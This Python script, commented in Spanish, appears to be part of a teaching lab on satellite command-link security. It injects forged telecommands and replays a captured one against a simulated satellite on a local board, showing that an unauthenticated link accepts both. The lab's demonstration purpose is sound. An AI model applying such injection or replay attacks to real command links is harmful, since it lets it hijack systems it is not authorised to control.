"""
Atacante - fase 0. Demo del "antes": sin autenticacion, cualquiera manda.

Este script NO es la estacion de tierra y no conoce ningun secreto, pero el
satelite le obedece igual, porque en la fase 0 no hay forma de distinguir un
telecomando legitimo de uno falso.

Escenarios:
  inject  -> inyecta un telecomando falso (pantalla en rojo = carga util secuestrada)
  replay  -> reenvia varias veces un telecomando "capturado" de la tierra

Uso (en PowerShell):
    python attacks/attack_f0.py --sat 192.168.1.50 inject
    python attacks/attack_f0.py --sat 192.168.1.50 replay --veces 3

Solo contra tu propio C5, en tu propia red.
"""

import argparse
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))
from ground_f0 import TC_PORT, enviar_tc  # noqa: E402

# Lo que un atacante habria "capturado" escuchando el enlace:
TC_CAPTURADO = "LED 0 200 0"  # la tierra poniendo la carga util en verde
TC_FALSO = "LED 255 0 0"      # rojo intenso: la carga util en manos del atacante


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Atacante (fase 0, solo para tu laboratorio)")
    p.add_argument("--sat", required=True, help="IP de TU C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="escenario", required=True)
    sub.add_parser("inject", help="inyectar un telecomando falso")
    rp = sub.add_parser("replay", help="reenviar un telecomando capturado")
    rp.add_argument("--veces", type=int, default=3)
    args = p.parse_args(argv)

    if args.escenario == "inject":
        print(f"[ATACANTE] Inyectando TC falso: \"{TC_FALSO}\"")
        r = enviar_tc(args.sat, TC_FALSO, port=args.port)
        print(f"[ATACANTE] Respuesta: {r}")
        if r and r.startswith("ACK"):
            print("[ATACANTE] El satelite ha aceptado un comando de alguien que no es la tierra.")
    else:
        aceptados = 0
        for i in range(1, args.veces + 1):
            r = enviar_tc(args.sat, TC_CAPTURADO, port=args.port)
            print(f"[ATACANTE] Replay {i}/{args.veces}: \"{TC_CAPTURADO}\" -> {r}")
            if r and r.startswith("ACK"):
                aceptados += 1
            time.sleep(0.5)
        print(f"[ATACANTE] {aceptados} de {args.veces} replays aceptados: "
              "el satelite no detecta que son comandos repetidos.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
